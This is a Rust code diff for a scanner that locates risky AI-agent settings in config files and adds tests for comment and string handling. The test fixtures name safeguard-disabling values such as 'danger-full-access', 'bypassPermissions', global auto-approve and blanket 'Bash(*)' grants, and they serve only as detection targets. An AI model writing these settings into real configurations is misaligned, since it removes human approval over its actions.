@@ -17,16 +17,18 @@ pub(crate) mod opaque_hook;
 pub(crate) mod plaintext_transport;
 pub(crate) mod trusted_server;
 pub(crate) mod unpinned_remote_package;
+pub(crate) mod unprompted_write_access;
 pub(crate) mod unrestricted_shell;
 pub(crate) mod unverified_download;
 
 use icu_properties::CodePointSetData;
 use icu_properties::props::{DefaultIgnorableCodePoint, VariationSelector};
 
+use crate::extract::Format;
 use crate::finding::{Evidence, Finding, Line, Position, RuleId};
+use crate::place::Places;
 use crate::repo_path::RepoPath;
 use crate::rule::{Examined, Subject};
-use crate::yaml::Span;
 
 /// Extensions of a file a shell runs.
 const SHELL_EXTENSIONS: &[&str] = &["sh", "bash", "zsh", "ksh", "dash"];
@@ -60,7 +62,6 @@ pub(crate) fn shell_sites(
             path,
             command,
             source,
-            occurrence,
             at: span,
         } => {
             let found: Vec<Finding> = sites(command)
@@ -70,8 +71,8 @@ pub(crate) fn shell_sites(
             if found.is_empty() {
                 return found;
             }
-            let place = where_command_sits(source, command, *occurrence, *span)
-                .and_then(|at| found_at(path, rule, source, at, width))
+            let place = span
+                .and_then(|held| found_at(path, rule, source, held.start, width))
                 .and_then(|found| found.at);
             found
                 .into_iter()
@@ -83,45 +84,6 @@ pub(crate) fn shell_sites(
         }
         _ => Vec::new(),
     }
-}
-
-/// Where `source` writes the `occurrence`th copy of `command`.
-///
-/// A settings file writes it as a JSON string, so the quoted form is looked
-/// for first and the finding points past the opening quote. A YAML `run:`
-/// block writes it bare, and a block spanning lines is indented, so the bare
-/// form is looked for by its first line: that is where the block starts, which
-/// is what a reviewer needs to find it. `None` when neither form is in the
-/// text, which leaves the finding about the file.
-pub(crate) fn where_command_sits(
-    source: &str,
-    command: &str,
-    occurrence: usize,
-    span: Option<Span>,
-) -> Option<usize> {
-    // Where the file said it is, when the reader knew. Nothing to search for.
-    if let Some(span) = span {
-        return (span.start <= source.len()).then_some(span.start);
-    }
-    where_written(source, command, occurrence)
-}
-
-/// Where `source` writes the `occurrence`th copy of `command`, by looking for
-/// it. Only for a format read without positions.
-pub(crate) fn where_written(source: &str, command: &str, occurrence: usize) -> Option<usize> {
-    let nth = |needle: &str| {
-        (!needle.is_empty())
-            .then(|| source.match_indices(needle).nth(occurrence))
-            .flatten()
-            .map(|(at, _)| at)
-    };
-    if let Some(at) = serde_json::to_string(command).ok().and_then(|written| {
-        // Past the opening quote, so the finding points at the command.
-        nth(&written).map(|at| at + 1)
-    }) {
-        return Some(at);
-    }
-    nth(command.lines().next().unwrap_or(command).trim_end())
 }
 
 /// Whether Unicode lists a character as `Default_Ignorable_Code_Point`: what a
@@ -139,112 +101,6 @@ pub fn is_hidden(c: char) -> bool {
     is_default_ignorable(c) && !CodePointSetData::new::<VariationSelector>().contains(c)
 }
 
-/// Where `source` writes the `occurrence`th `value` belonging to `key`.
-///
-/// Anchored to the key: the same word often appears elsewhere in a file, and a
-/// finding there would name a line nothing is wrong with. `None` when either
-/// is written in a form the text does not hold, which leaves the finding about
-/// the file rather than at a wrong place.
-pub(crate) fn after_key(source: &str, key: &str, value: &str, occurrence: usize) -> Option<usize> {
-    // A file writes the whole key, as VS Code does, or only its last segment,
-    // as one nesting `defaultMode` under `permissions` does.
-    let leaf = key.rsplit('.').next().unwrap_or(key);
-    let from = key_end(source, key).or_else(|| key_end(source, leaf))?;
-    let rest = source.get(from..)?;
-    let quoted = format!("\"{value}\"");
-    let at = match rest.match_indices(&quoted).nth(occurrence) {
-        // Past the opening quote, so the finding points at the value.
-        Some((at, _)) => at + 1,
-        // Frontmatter writes a list unquoted.
-        None => whole_word(rest, value).nth(occurrence)?,
-    };
-    Some(from + at)
-}
-
-/// The builtin a `crushrc` lists its pre-approvals with. A `crushrc` holds no
-/// key to anchor to, so a grant is anchored to the call that makes it.
-pub(crate) const GRANT_BUILTIN: &[&str] = &["permissions", "allow"];
-
-/// The builtin a `crushrc` declares a server with.
-pub(crate) const SERVER_BUILTIN: &[&str] = &["mcp", "add"];
-
-/// Where `value` sits on the line whose first words are `words`.
-///
-/// A shell builtin separates a name from its values with spaces, which
-/// [`after_key`] does not accept as a separator and must not: a bare word
-/// followed by a space is most of English. Anchoring to the whole call instead
-/// keeps a `crushrc` finding on the line that causes it, where a fallback to
-/// the file would leave a reviewer nothing to look at.
-pub(crate) fn after_words(
-    source: &str,
-    words: &[&str],
-    value: &str,
-    occurrence: usize,
-) -> Option<usize> {
-    let mut seen = 0;
-    let mut start = 0;
-    for line in source.split_inclusive('\n') {
-        let at = start;
-        start += line.len();
-
-        // The call, in order, each word whole and the last one followed by the
-        // values it is being given.
-        let mut rest = line.trim_start();
-        let called = words.iter().all(|word| match rest.strip_prefix(*word) {
-            Some(after) if after.starts_with(char::is_whitespace) => {
-                rest = after.trim_start();
-                true
-            }
-            _ => false,
-        });
-        if !called {
-            continue;
-        }
-
-        let from = line.len() - rest.len();
-        for found in whole_word(rest, value) {
-            if seen == occurrence {
-                return Some(at + from + found);
-            }
-            seen += 1;
-        }
-    }
-    None
-}
-
-/// Just past `key` where `source` writes it as a key: quoted, as JSON does, or
-/// bare before its separator, as TOML and YAML do.
-fn key_end(source: &str, key: &str) -> Option<usize> {
-    let quoted = format!("\"{key}\"");
-    if let Some(at) = source.find(&quoted) {
-        return Some(at + quoted.len());
-    }
-    source
-        .match_indices(key)
-        .find(|(at, _)| {
-            let before_is_word = source[..*at]
-                .chars()
-                .next_back()
-                .is_some_and(|c| c.is_alphanumeric() || c == '_' || c == '-');
-            let after = source[at + key.len()..].trim_start();
-            !before_is_word && (after.starts_with('=') || after.starts_with(':'))
-        })
-        .map(|(at, _)| at + key.len())
-}
-
-/// Where `text` holds `word` whole: no identifier character runs into it, and
-/// nothing opens a longer form after it.
-fn whole_word<'a>(text: &'a str, word: &'a str) -> impl Iterator<Item = usize> + 'a {
-    text.match_indices(word)
-        .filter(|(at, _)| {
-            let before = text[..*at].chars().next_back();
-            let after = text[at + word.len()..].chars().next();
-            !before.is_some_and(|c| c.is_alphanumeric() || c == '_')
-                && !after.is_some_and(|c| c.is_alphanumeric() || c == '_' || c == '(')
-        })
-        .map(|(at, _)| at)
-}
-
 /// A finding about a whole file, for when its place cannot be told.
 pub(crate) fn about_file(path: &RepoPath, rule: RuleId, said: &str, width: usize) -> Finding {
     Finding {
@@ -255,23 +111,6 @@ pub(crate) fn about_file(path: &RepoPath, rule: RuleId, said: &str, width: usize
         evidence: Evidence::quote(&Line::new(said), 0, width),
     }
 }
-
-/// The keys a tool lists its pre-approvals under. A grant is looked for only
-/// after one of them, so a tool name in a description is not taken for a grant.
-/// The longer spellings precede the ones they contain, so a Crush
-/// `allowed_tools` is not half-matched as `allowed` and left unplaced.
-pub(crate) const GRANT_LISTS: &[&str] = &["allow", "allowed-tools", "allowed_tools", "allowed"];
-
-/// The keys a tool declares its servers under. A name is looked for only after
-/// one of them, so a name repeated in a description is not taken for the
-/// declaration.
-pub(crate) const SERVER_BLOCKS: &[&str] = &[
-    "mcpServers",
-    "mcp_servers",
-    "context_servers",
-    "servers",
-    "mcp",
-];
 
 /// Whether `text` is a shell script, by its name, its extension or its `#!`
 /// line.
@@ -289,6 +128,20 @@ pub(crate) fn is_shell(path: &RepoPath, text: &str) -> bool {
                 .any(|word| matches!(word, "sh" | "bash" | "zsh" | "ksh" | "dash" | "fish"))
 }
 
+/// Where byte `at` of `text` is, counted for a report, with the line there.
+pub(crate) fn placed(text: &str, at: usize) -> Option<(Position, &str)> {
+    let before = text.get(..at)?;
+    let start = before.rfind('\n').map_or(0, |newline| newline + 1);
+    let column = text.get(start..at)?.chars().count();
+    Some((
+        Position {
+            line: before.matches('\n').count() + 1,
+            column: column + 1,
+        },
+        text.get(start..)?.lines().next().unwrap_or_default(),
+    ))
+}
+
 /// A finding under `rule` at byte `at` of `text`, quoting its line.
 pub(crate) fn found_at(
     path: &RepoPath,
@@ -297,20 +150,49 @@ pub(crate) fn found_at(
     at: usize,
     width: usize,
 ) -> Option<Finding> {
-    let before = text.get(..at)?;
-    let start = before.rfind('\n').map_or(0, |newline| newline + 1);
-    let column = text.get(start..at)?.chars().count();
-    let raw = text.get(start..)?.lines().next().unwrap_or_default();
+    let (position, raw) = placed(text, at)?;
     Some(Finding {
         path: path.clone(),
-        at: Some(Position {
-            line: before.matches('\n').count() + 1,
-            column: column + 1,
-        }),
+        at: Some(position),
         rule,
         severity: rule.severity(),
-        evidence: Evidence::quote(&Line::new(raw), column, width),
+        evidence: Evidence::quote(&Line::new(raw), position.column - 1, width),
     })
+}
+
+/// Where a file wrote `key`'s `value`, for a finding placed later.
+///
+/// Resolved while the file's text is in hand rather than kept with it: a rule
+/// reading a whole scan would otherwise need every file it read held open
+/// until the scan ends.
+pub(crate) fn placed_value(text: &str, format: Format, key: &str, value: &str) -> Option<Position> {
+    let at = Places::given(text, format, &[key], &[]).nth(value, 0)?;
+    placed(text, at).map(|(position, _)| position)
+}
+
+/// A finding at `at`, quoting `said` rather than whatever line is there.
+///
+/// For a rule about two places at once. The position takes a reader to one of
+/// them, and the evidence has to name both: a rule whose halves are each
+/// silent on their own would otherwise quote a line its own prose calls
+/// harmless, and a reader would be right to think the finding wrong.
+///
+/// `at` is absent when nothing could be placed, which is the case
+/// [`about_file`] covers for a rule reading one file.
+pub(crate) fn said_at(
+    path: &RepoPath,
+    rule: RuleId,
+    at: Option<Position>,
+    said: &str,
+    width: usize,
+) -> Finding {
+    Finding {
+        path: path.clone(),
+        at,
+        rule,
+        severity: rule.severity(),
+        evidence: Evidence::quote(&Line::new(said), 0, width),
+    }
 }
 
 /// Non-printing Unicode in a file an agent reads as instructions: the Rules
@@ -353,7 +235,606 @@ mod tests {
     use crate::finding::{DEFAULT_EVIDENCE_WIDTH, Severity};
     use crate::mcp_server::McpServer;
     use crate::permission::Permission;
+    use crate::place::{self, Places};
+
+    /// Where a file declares the server `name` inside `block`.
+    fn at_of(source: &str, block: &str, name: &str) -> Option<usize> {
+        Places::declared(source, Format::Json, crate::mcp_server::BLOCKS)
+            .nth_in(block, name, 0)
+            .map(|held| held.start)
+            .or_else(|| {
+                Places::given(source, Format::Crushrc, &[], place::SERVER_BUILTIN).nth(name, 0)
+            })
+    }
     use crate::rule::judge;
+
+    /// A key written in a comment is not a declaration, and a finding placed
+    /// at one quotes the commented line as its evidence, which reads as a
+    /// finding against a setting somebody had already turned off.
+    #[test]
+    fn a_commented_key_is_not_where_a_setting_was_written() {
+        let toml =
+            "# sandbox_mode = \"danger-full-access\"\nsandbox_mode = \"danger-full-access\"\n";
+
+        let at = Places::given(toml, Format::Toml, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        let (position, line) = placed(toml, at).expect("a position");
+        assert_eq!(position.line, 2, "{line:?}");
+        assert!(!line.starts_with('#'), "{line:?}");
+    }
+
+    /// The same in a format whose comments open with two slashes.
+    #[test]
+    fn a_key_behind_two_slashes_is_a_comment_too() {
+        let jsonc = "{\n  // \"chat.tools.global.autoApprove\": true,\n  \"chat.tools.global.autoApprove\": true\n}\n";
+
+        let at = Places::given(
+            jsonc,
+            Format::Jsonc,
+            &["chat.tools.global.autoApprove"],
+            &[],
+        )
+        .nth("true", 0)
+        .expect("placed");
+
+        let (position, line) = placed(jsonc, at).expect("a position");
+        assert_eq!(position.line, 3, "{line:?}");
+    }
+
+    /// A comment need not open the line. TOML and YAML both end a line at an
+    /// unquoted `#`, so a note left after a real setting can hold a key too.
+    #[test]
+    fn a_key_in_a_trailing_comment_is_not_a_declaration() {
+        let toml = "approval_policy = \"never\"  # sandbox_mode = \"workspace-write\" was here\nsandbox_mode = \"workspace-write\"\n";
+
+        let at = Places::given(toml, Format::Toml, &["sandbox_mode"], &[])
+            .nth("workspace-write", 0)
+            .expect("placed");
+
+        assert_eq!(placed(toml, at).expect("a position").0.line, 2);
+    }
+
+    /// A block comment that opens the line, which JSONC accepts.
+    #[test]
+    fn a_key_inside_an_opening_block_comment_is_not_a_declaration() {
+        let jsonc = "{\n/* \"chat.tools.global.autoApprove\": true, */\n  \"chat.tools.global.autoApprove\": true\n}\n";
+
+        let at = Places::given(
+            jsonc,
+            Format::Jsonc,
+            &["chat.tools.global.autoApprove"],
+            &[],
+        )
+        .nth("true", 0)
+        .expect("placed");
+
+        assert_eq!(placed(jsonc, at).expect("a position").0.line, 3);
+    }
+
+    /// JSONC ends a line at `//` wherever it appears, which the extractor
+    /// already strips, so a key behind one is a setting somebody turned off.
+    #[test]
+    fn a_key_behind_a_trailing_slash_comment_is_not_a_declaration() {
+        let jsonc = "{\n  \"x\": 0, // \"chat.tools.global.autoApprove\": true,\n  \"chat.tools.global.autoApprove\": true\n}\n";
+
+        let at = Places::given(
+            jsonc,
+            Format::Jsonc,
+            &["chat.tools.global.autoApprove"],
+            &[],
+        )
+        .nth("true", 0)
+        .expect("placed");
+
+        assert_eq!(placed(jsonc, at).expect("a position").0.line, 3);
+    }
+
+    /// A block JSONC opens mid-line ends the same way.
+    #[test]
+    fn a_key_inside_a_block_opened_mid_line_is_not_a_declaration() {
+        let jsonc = "{\"x\": 0, /* \"chat.tools.global.autoApprove\": true, */ \"chat.tools.global.autoApprove\": true}\n";
+
+        let at = Places::given(
+            jsonc,
+            Format::Jsonc,
+            &["chat.tools.global.autoApprove"],
+            &[],
+        )
+        .nth("true", 0)
+        .expect("placed");
+
+        // Past the block, which is where the declaration is.
+        let (position, _) = placed(jsonc, at).expect("a position");
+        assert!(position.column > 60, "{position:?}");
+    }
+
+    /// JSON has no comments, so neither marker means anything in one and a
+    /// key after either is still a key.
+    #[test]
+    fn json_has_no_comments_to_skip() {
+        let json =
+            "{\"note\": \"// and # and /* are text\", \"sandbox_mode\": \"danger-full-access\"}\n";
+
+        let at = Places::given(json, Format::Json, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        assert_eq!(placed(json, at).expect("a position").0.line, 1);
+    }
+
+    /// TOML takes a single-quoted string literally, so a key inside one is
+    /// text. YAML quotes the same way.
+    #[test]
+    fn a_key_inside_a_literal_string_is_not_a_declaration() {
+        for (format, source) in [
+            (
+                Format::Toml,
+                "note = 'sandbox_mode = \"danger-full-access\" is the one to avoid'\nsandbox_mode = \"danger-full-access\"\n",
+            ),
+            (
+                Format::Yaml,
+                "note: 'sandbox_mode = \"danger-full-access\"'\nsandbox_mode: \"danger-full-access\"\n",
+            ),
+        ] {
+            let at = Places::given(source, format, &["sandbox_mode"], &[])
+                .nth("danger-full-access", 0)
+                .expect("placed");
+
+            assert_eq!(
+                placed(source, at).expect("a position").0.line,
+                2,
+                "{format:?}"
+            );
+        }
+    }
+
+    /// TOML writes a long value between three quotes, and a key inside one is
+    /// text too. Counting those quotes one at a time leaves the scan on the
+    /// wrong side of the string: three of them open one, close it and open it
+    /// again, so a quote anywhere in the block puts the scan back in code and
+    /// the note starts declaring things.
+    #[test]
+    fn a_key_inside_a_multi_line_string_is_not_a_declaration() {
+        let toml = "note = \"\"\"\na \" then sandbox_mode = \"danger-full-access\"\n\"\"\"\nsandbox_mode = \"danger-full-access\"\n";
+
+        let at = Places::given(toml, Format::Toml, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        assert_eq!(placed(toml, at).expect("a position").0.line, 4);
+    }
+
+    /// A file may declare the same name in two of the blocks clew reads, and
+    /// extraction keeps both because they are two declarations. A finding
+    /// about one of them is placed at that one: looking the name up again
+    /// would find whichever block came first and could quote the safe
+    /// sibling as the evidence for the unsafe one.
+    #[test]
+    fn a_name_declared_in_two_blocks_is_placed_in_its_own() {
+        let json = "{\n  \"mcpServers\": {\n    \"pg\": {\n      \"command\": \"pg\"\n    }\n  },\n  \"servers\": {\n    \"pg\": {\n      \"trust\": true\n    }\n  }\n}\n";
+
+        let found = judge(
+            &Examined::Server {
+                path: &RepoPath::root().join(".mcp.json"),
+                server: &McpServer {
+                    block: "servers".to_owned(),
+                    ..declared("pg", true)
+                },
+                source: json,
+                at: at_of(json, "servers", "pg"),
+            },
+            &[RuleId::TrustedServer],
+            DEFAULT_EVIDENCE_WIDTH,
+        );
+
+        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(found[0].at.map(|p| p.line), Some(8), "{found:?}");
+    }
+
+    /// A server's name is placed at the key declaring it, not at the first
+    /// place the block happens to say it: a sibling naming it in its own
+    /// arguments comes first in the file and is not the declaration.
+    #[test]
+    fn a_server_named_in_a_sibling_is_not_its_declaration() {
+        let json = "{\n  \"mcpServers\": {\n    \"proxy\": {\n      \"args\": [\"--to\", \"pg\"]\n    },\n    \"pg\": {\n      \"trust\": true\n    }\n  }\n}\n";
+
+        let found = judge(
+            &Examined::Server {
+                path: &RepoPath::root().join(".mcp.json"),
+                server: &declared("pg", true),
+                source: json,
+                at: at_of(json, "mcpServers", "pg"),
+            },
+            &[RuleId::TrustedServer],
+            DEFAULT_EVIDENCE_WIDTH,
+        );
+
+        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(found[0].at.map(|p| p.line), Some(6), "{found:?}");
+    }
+
+    /// A server named like a property an earlier one holds is a declaration
+    /// of its own, so a finding about it quotes its own line rather than the
+    /// line that happens to spell its name inside another server.
+    #[test]
+    fn a_server_named_like_a_property_is_its_own_declaration() {
+        let json = "{\n  \"mcpServers\": {\n    \"proxy\": {\n      \"command\": \"./proxy\"\n    },\n    \"command\": {\n      \"trust\": true\n    }\n  }\n}\n";
+
+        let found = judge(
+            &Examined::Server {
+                path: &RepoPath::root().join(".mcp.json"),
+                server: &declared("command", true),
+                source: json,
+                at: at_of(json, "mcpServers", "command"),
+            },
+            &[RuleId::TrustedServer],
+            DEFAULT_EVIDENCE_WIDTH,
+        );
+
+        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(found[0].at.map(|p| p.line), Some(6), "{found:?}");
+    }
+
+    /// Codex's reference declares a server as a table, `[mcp_servers.pg]`,
+    /// and a finding about it is placed at that header rather than at the
+    /// file.
+    #[test]
+    fn a_server_declared_as_a_table_is_placed_at_its_header() {
+        let toml = "# servers\n[mcp_servers.pg]\nurl = \"http://mcp.invalid/sse\"\n";
+
+        let found = judge(
+            &Examined::Server {
+                path: &RepoPath::root().join(".codex/config.toml"),
+                server: &McpServer {
+                    block: "mcp_servers".to_owned(),
+                    transport: crate::mcp_server::Transport::remote("http://mcp.invalid/sse"),
+                    ..declared("pg", false)
+                },
+                source: toml,
+                at: Places::declared(toml, Format::Toml, crate::mcp_server::BLOCKS)
+                    .nth_in("mcp_servers", "pg", 0)
+                    .map(|held| held.start),
+            },
+            &[RuleId::PlaintextTransport],
+            DEFAULT_EVIDENCE_WIDTH,
+        );
+
+        assert_eq!(found.len(), 1, "{found:?}");
+        assert_eq!(found[0].at.map(|p| p.line), Some(2), "{found:?}");
+    }
+
+    /// YAML writes a key's values as an indented block beneath it as well as
+    /// on its line, and frontmatter uses both. The block is that key's
+    /// values, so a finding points at the one it is about rather than at the
+    /// file.
+    #[test]
+    fn a_block_beneath_a_key_holds_its_values() {
+        let frontmatter = "---\nallowed-tools:\n  - Bash(ls)\n  - Read\n---\n";
+
+        let first = Places::given(frontmatter, Format::Markdown, &["allowed-tools"], &[])
+            .nth("Bash(ls)", 0)
+            .expect("placed");
+        let second = Places::given(frontmatter, Format::Markdown, &["allowed-tools"], &[])
+            .nth("Read", 0)
+            .expect("placed");
+
+        assert_eq!(placed(frontmatter, first).expect("a position").0.line, 3);
+        assert_eq!(placed(frontmatter, second).expect("a position").0.line, 4);
+    }
+
+    /// And the block ends where the indentation does, so a sibling key's
+    /// value is not one of these.
+    #[test]
+    fn a_block_ends_at_the_next_key_beside_it() {
+        let frontmatter = "---\nallowed-tools:\n  - Bash(ls)\nname: Read\n---\n";
+
+        assert!(
+            Places::given(frontmatter, Format::Markdown, &["allowed-tools"], &[])
+                .nth("Read", 0)
+                .is_none(),
+            "a sibling key's value is not in the block"
+        );
+    }
+
+    /// A compact file writes a whole object on one line, so a value's span
+    /// cannot run to the newline there: it ends where the next entry begins.
+    /// Otherwise the first key's span swallows every key after it.
+    #[test]
+    fn a_value_in_a_flow_collection_ends_at_the_next_entry() {
+        let json = "{\"runOn\":\"folderOpen\",\"label\":\"folderOpen\",\"runOn\":\"folderOpen\"}\n";
+
+        let second = Places::given(json, Format::Json, &["runOn"], &[])
+            .nth("folderOpen", 1)
+            .expect("placed");
+
+        // The second `runOn`, which is the last of the three values.
+        assert!(
+            second > json.rfind("\"runOn\"").expect("a second key"),
+            "{second} is not past the second key"
+        );
+    }
+
+    /// And YAML writes one on a line too, where a comma separates nothing:
+    /// `allowed-tools: Bash(a), Read` is one key given two values.
+    #[test]
+    fn a_comma_outside_a_flow_collection_ends_nothing() {
+        let frontmatter = "---\nallowed-tools: Bash(cargo test:*), Read\n---\n";
+
+        let at = Places::given(frontmatter, Format::Markdown, &["allowed-tools"], &[])
+            .nth("Read", 0)
+            .expect("placed");
+
+        assert_eq!(placed(frontmatter, at).expect("a position").0.line, 2);
+    }
+
+    /// A dotted key names a path, and a file may write only its last
+    /// segment, so placement looks for that too. It looks for it under the
+    /// parent the key names: another block writing the same leaf is a
+    /// different setting, and anchoring there put the finding on it.
+    #[test]
+    fn a_leaf_is_looked_for_under_the_parent_its_key_names() {
+        let json = "{\n  \"other\": {\n    \"defaultMode\": \"bypassPermissions\"\n  },\n  \"permissions\": {\n    \"defaultMode\": \"bypassPermissions\"\n  }\n}\n";
+
+        let at = Places::given(json, Format::Json, &["permissions.defaultMode"], &[])
+            .nth("bypassPermissions", 0)
+            .expect("placed");
+
+        assert_eq!(placed(json, at).expect("a position").0.line, 6);
+    }
+
+    /// An occurrence counts the values a key was given, not every copy of
+    /// the text after it. A `label` holding the same word between two
+    /// declarations is another key's value, and counting it put the second
+    /// finding on the label.
+    #[test]
+    fn a_value_under_another_key_is_not_a_copy_of_this_one() {
+        let json = "{\n  \"runOn\": \"folderOpen\",\n  \"label\": \"folderOpen\",\n  \"runOn\": \"folderOpen\"\n}\n";
+
+        let first = Places::given(json, Format::Json, &["runOn"], &[])
+            .nth("folderOpen", 0)
+            .expect("placed");
+        let second = Places::given(json, Format::Json, &["runOn"], &[])
+            .nth("folderOpen", 1)
+            .expect("placed");
+
+        assert_eq!(placed(json, first).expect("a position").0.line, 2);
+        assert_eq!(placed(json, second).expect("a position").0.line, 4);
+    }
+
+    /// And a key given a list keeps counting that list, since one key with
+    /// several values is how a pre-approval is written.
+    #[test]
+    fn a_key_given_a_list_counts_the_list() {
+        let json = "{\n  \"allow\": [\n    \"Bash(*)\",\n    \"Bash(*)\"\n  ]\n}\n";
+
+        let first = Places::given(json, Format::Json, &["allow"], &[])
+            .nth("Bash(*)", 0)
+            .expect("placed");
+        let second = Places::given(json, Format::Json, &["allow"], &[])
+            .nth("Bash(*)", 1)
+            .expect("placed");
+
+        assert_eq!(placed(json, first).expect("a position").0.line, 3);
+        assert_eq!(placed(json, second).expect("a position").0.line, 4);
+    }
+
+    /// A value named in a comment is a note too. Placement finds the key and
+    /// then counts copies of the value after it, so a note between two
+    /// declarations put the second finding on the note.
+    #[test]
+    fn a_value_in_a_comment_is_not_a_copy_of_it() {
+        let jsonc = "{\n  \"runOn\": \"folderOpen\",\n  // \"folderOpen\" was here\n  \"runOn\": \"folderOpen\"\n}\n";
+
+        let first = Places::given(jsonc, Format::Jsonc, &["runOn"], &[])
+            .nth("folderOpen", 0)
+            .expect("placed");
+        let second = Places::given(jsonc, Format::Jsonc, &["runOn"], &[])
+            .nth("folderOpen", 1)
+            .expect("placed");
+
+        assert_eq!(placed(jsonc, first).expect("a position").0.line, 2);
+        assert_eq!(placed(jsonc, second).expect("a position").0.line, 4);
+    }
+
+    /// A long basic string honours escapes, so an escaped quote does not
+    /// close it. Three quotes counted without that leave the scan outside a
+    /// string it is still inside, and the note starts declaring things.
+    #[test]
+    fn an_escaped_quote_does_not_close_a_long_string() {
+        let toml = "note = \"\"\"a \\\"\"\" then sandbox_mode = \"danger-full-access\"\n\"\"\"\nsandbox_mode = \"danger-full-access\"\n";
+
+        let at = Places::given(toml, Format::Toml, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        assert_eq!(placed(toml, at).expect("a position").0.line, 3);
+    }
+
+    /// TOML lets up to two quotes sit against the closing delimiter, so a run
+    /// of four or five closes a long string and the extras belong to the
+    /// value. Closing at the first three leaves one over, which opens a
+    /// string of its own and swallows the rest of the file.
+    #[test]
+    fn a_long_string_closes_on_the_last_three_of_a_run() {
+        for note in ["\"\"\"text\"\"\"\"", "\"\"\"text\"\"\"\"\""] {
+            let toml = format!("note = {note}\nsandbox_mode = \"danger-full-access\"\n");
+
+            let at = Places::given(&toml, Format::Toml, &["sandbox_mode"], &[])
+                .nth("danger-full-access", 0)
+                .expect("placed");
+
+            assert_eq!(placed(&toml, at).expect("a position").0.line, 2, "{note:?}");
+        }
+    }
+
+    /// A long literal string honours none, so a backslash in one is a
+    /// backslash and the three quotes after it still close.
+    #[test]
+    fn a_backslash_in_a_long_literal_string_closes_nothing() {
+        let toml = "note = '''a \\'''\nsandbox_mode = \"danger-full-access\"\n";
+
+        let at = Places::given(toml, Format::Toml, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        assert_eq!(placed(toml, at).expect("a position").0.line, 2);
+    }
+
+    /// Shell opens a comment wherever a token begins, which is after an
+    /// operator as much as after a space. A `crushrc` is Bash, and placement
+    /// looks for a key before it looks for the builtin that grants, so a
+    /// commented `allow =` would otherwise win over the real call.
+    #[test]
+    fn a_hash_after_a_shell_operator_opens_a_comment() {
+        for opens in [":;", ":&&", ":||", "(:)"] {
+            // The commented line holds the value as well as the key, or the
+            // search for the value would land on the real call anyway and
+            // this would pass whatever the comment rule says.
+            let source = format!("{opens}# allow = \"Bash(*)\"\npermissions allow \"Bash(*)\"\n");
+
+            let found = grant_found_as("Bash(*)", &source, 0, Format::Crushrc).expect("a finding");
+
+            assert_eq!(found.at.map(|p| p.line), Some(2), "{opens:?}: {found:?}");
+        }
+    }
+
+    /// YAML needs whitespace before a `#` for it to be a comment, so a hash
+    /// inside an unquoted scalar is part of the value.
+    #[test]
+    fn a_hash_inside_an_unquoted_scalar_is_not_a_comment() {
+        let yaml = "{tag: a#b, runOn: fileCreate}\n";
+
+        let at = Places::given(yaml, Format::Yaml, &["runOn"], &[])
+            .nth("fileCreate", 0)
+            .expect("placed");
+
+        assert_eq!(placed(yaml, at).expect("a position").0.line, 1);
+    }
+
+    /// TOML does not need the whitespace: a `#` outside a string ends the
+    /// line wherever it sits, so a note written tight against a value is
+    /// still a note.
+    #[test]
+    fn a_hash_against_a_value_ends_a_toml_line() {
+        let toml =
+            "x = 1# sandbox_mode = \"danger-full-access\"\nsandbox_mode = \"danger-full-access\"\n";
+
+        let at = Places::given(toml, Format::Toml, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        assert_eq!(placed(toml, at).expect("a position").0.line, 2);
+    }
+
+    /// TOML and YAML both allow a quoted key, in either quote. Reading only
+    /// the double-quoted form left a single-quoted one skipped as a value,
+    /// and the finding fell back to naming the file.
+    #[test]
+    fn a_single_quoted_key_is_a_key() {
+        for (format, source) in [
+            (Format::Toml, "'sandbox_mode' = \"danger-full-access\"\n"),
+            (Format::Yaml, "'runOn': fileCreate\n"),
+        ] {
+            let value = if format == Format::Toml {
+                "danger-full-access"
+            } else {
+                "fileCreate"
+            };
+            let key = if format == Format::Toml {
+                "sandbox_mode"
+            } else {
+                "runOn"
+            };
+
+            let at = Places::given(source, format, &[key], &[])
+                .nth(value, 0)
+                .expect("placed");
+
+            let (position, _) = placed(source, at).expect("a position");
+            assert_eq!(position.line, 1, "{format:?}");
+            // Past the key, which is where the value sits.
+            assert!(position.column > key.len(), "{format:?}: {position:?}");
+        }
+    }
+
+    /// A key and a value look the same in JSON, both inside quotes, so what
+    /// tells them apart is the separator after the closing quote. Measured
+    /// before this was checked: anchoring on the value named like the key put
+    /// the finding on the next thing that looked like the value, which here
+    /// is a different setting entirely.
+    #[test]
+    fn a_quoted_key_that_is_really_a_value_is_not_a_declaration() {
+        let json = "{\"note\": \"sandbox_mode\", \"other\": \"danger-full-access\", \"sandbox_mode\": \"danger-full-access\"}\n";
+
+        let at = Places::given(json, Format::Json, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        // Past the real declaration, rather than at the `other` holding the
+        // same value, which is where anchoring on the note landed.
+        let declared = json.rfind("\"sandbox_mode\"").expect("a declaration");
+        assert!(at > declared, "{at} is not past {declared}");
+    }
+
+    /// A `#` inside a string is part of the value, so the key after it on the
+    /// same line is still a declaration.
+    #[test]
+    fn a_hash_inside_a_string_does_not_open_a_comment() {
+        let json = "{\"note\": \"a #tag\", \"sandbox_mode\": \"danger-full-access\"}\n";
+
+        let at = Places::given(json, Format::Json, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        assert_eq!(placed(json, at).expect("a position").0.line, 1);
+    }
+
+    /// Two slashes are a comment only where they open a line. A url carries
+    /// them mid-line and YAML writes one unquoted, so reading those as a
+    /// comment would lose every key written after a url on the same line.
+    #[test]
+    fn two_slashes_in_a_url_do_not_open_a_comment() {
+        let yaml = "{server: https://example.invalid/x, runOn: fileCreate}\n";
+
+        let at = Places::given(yaml, Format::Yaml, &["runOn"], &[])
+            .nth("fileCreate", 0)
+            .expect("placed");
+
+        let (position, _) = placed(yaml, at).expect("a position");
+        assert_eq!(position.line, 1);
+        // Past the url, which is what the key being lost would look like.
+        assert!(position.column > 40, "{position:?}");
+    }
+
